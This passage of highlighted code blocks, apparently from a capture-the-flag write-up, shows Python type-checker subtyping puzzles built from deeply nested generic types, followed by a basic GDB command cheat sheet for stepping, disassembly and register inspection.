    <span class="token keyword">def</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">def</span> <span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">x<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">5</span>                  <span class="token comment"># Is type(5) a subtype of int? </span>
y<span class="token punctuation">:</span> <span class="token builtin">float</span> <span class="token operator">=</span> <span class="token string">"abc"</span>            <span class="token comment"># Is type("abc") a subtype of float? </span>
z<span class="token punctuation">:</span> Challenge <span class="token operator">=</span> Reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Is type(Reverse()) a subtype of Challenge? </span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">class</span> <span class="token class-name">Challenge</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">Reverse</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">Web</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">Pwn</span><span class="token punctuation">(</span>Challenge<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token comment"># Create a list of different challenges.</span>
chals<span class="token punctuation">:</span> List<span class="token punctuation">[</span>Challenge<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>Reverse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Web<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Create a generic list type using an invariant type variable T.</span>
T <span class="token operator">=</span> TypeVar<span class="token punctuation">(</span><span class="token string">'T'</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">MyList</span><span class="token punctuation">(</span>Generic<span class="token punctuation">[</span>T<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token keyword">def</span> <span class="token function">display</span><span class="token punctuation">(</span>chals<span class="token punctuation">:</span> MyList<span class="token punctuation">[</span>Challenge<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

display<span class="token punctuation">(</span>MyList<span class="token punctuation">[</span>Reverse<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># ERROR! Argument 1 to "display" has incompatible type "MyList[Reverse]"; expected "MyList[Challenge]"</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">T <span class="token operator">=</span> TypeVar<span class="token punctuation">(</span><span class="token string">'T'</span><span class="token punctuation">,</span> covariant<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>Generic<span class="token punctuation">[</span>T<span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span><span class="token string">"C[T]"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> B<span class="token punctuation">[</span><span class="token string">"A[T]"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> B<span class="token punctuation">[</span>C<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span>C<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> TypeVar<span class="token punctuation">,</span> Generic<span class="token punctuation">,</span> Any
z <span class="token operator">=</span> TypeVar<span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> contravariant<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">N</span><span class="token punctuation">(</span>Generic<span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
x <span class="token operator">=</span> TypeVar<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>Generic<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> N<span class="token punctuation">[</span>N<span class="token punctuation">[</span><span class="token string">"C[C[x]]"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">T</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">class</span> <span class="token class-name">U</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> N<span class="token punctuation">[</span>C<span class="token punctuation">[</span>U<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> C<span class="token punctuation">[</span>T<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># Subtype query: CT &lt;: NCU.</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">a<span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s71<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
b<span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s46<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
c<span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s06<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_d<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
d<span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s30<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_d<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_n<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s46<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Super.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">[</span>QRL_s46<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># Cancel.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> QRL_s46<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">_</span><span class="token punctuation">:</span> QRL_s46<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRL_s46<span class="token punctuation">[</span>N<span class="token punctuation">[</span>QLW_s46<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Initial query.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s46<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># Midway.</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QLW_s46<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">_</span><span class="token punctuation">:</span> QLR_s46<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s46<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> L_s<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QR_s46<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s71<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_x<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s71<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_x<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># QRW_s71 query (original).</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s71<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># QRW_s71 query (deduced from QRW_s46).</span>
<span class="token keyword">_</span><span class="token punctuation">:</span> E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> QRW_s71<span class="token punctuation">[</span>L___TAPE_END__<span class="token punctuation">[</span>N<span class="token punctuation">[</span>MR<span class="token punctuation">[</span>N<span class="token punctuation">[</span>L_x<span class="token punctuation">[</span>N<span class="token punctuation">[</span>E<span class="token punctuation">[</span>E<span class="token punctuation">[</span>Z<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Describes how to use a command.</span>
<span class="token builtin class-name">help</span>
<span class="token builtin class-name">help</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span>
<span class="token builtin class-name">help</span> info
<span class="token builtin class-name">help</span> breakpoint</code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh">gdb <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">file</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">start    <span class="token comment"># Starts program and breaks at beginning.</span>
run      <span class="token comment"># Runs program normally.</span>
<span class="token builtin class-name">continue</span> <span class="token comment"># Continue program where you left off.</span>
<span class="token function">kill</span>     <span class="token comment"># Kill process.</span>
quit     <span class="token comment"># Leave GDB.</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">shell <span class="token operator">&lt;</span>cmd<span class="token operator">&gt;</span>
shell <span class="token builtin class-name">echo</span> Hi
<span class="token operator">!</span><span class="token operator">&lt;</span>cmd<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Step Debugging</span>
<span class="token comment">## Step (into).</span>
step
s
<span class="token comment">## Step over.</span>
next
n
<span class="token comment">## Step (into) one instruction exactly.</span>
stepi
si
<span class="token comment">## Step over one instruction.</span>
nexti
ni
<span class="token comment">## Step out. Execute until (selected) stack frame returns (past end of function).</span>
finish
fin</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">disas <span class="token operator">&lt;</span>address/function<span class="token operator">&gt;</span>
disas <span class="token operator">&lt;</span>start addr<span class="token operator">&gt;</span>,<span class="token operator">&lt;</span>end addr<span class="token operator">&gt;</span>
disas <span class="token operator">&lt;</span>start addr<span class="token operator">&gt;</span>,+<span class="token operator">&lt;</span>offset<span class="token operator">&gt;</span>

disas main</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> disassembly-flavor intel</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">x/<span class="token punctuation">[</span>n<span class="token punctuation">]</span>i <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>
x/20i 0x5555555dddd0</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">print <span class="token punctuation">[</span>expression<span class="token punctuation">]</span>

print <span class="token variable">$rax</span>
p <span class="token variable">$rax</span>

<span class="token comment"># Expressions are evaluated.</span>
p <span class="token variable">$rbx</span>+<span class="token variable">$rcx</span>*4</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">info registers
info r
registers <span class="token comment"># (GEF)</span>
reg       <span class="token comment"># (GEF)</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> <span class="token variable">$eax</span> <span class="token operator">=</span> 0xdeadbeef</code></pre>
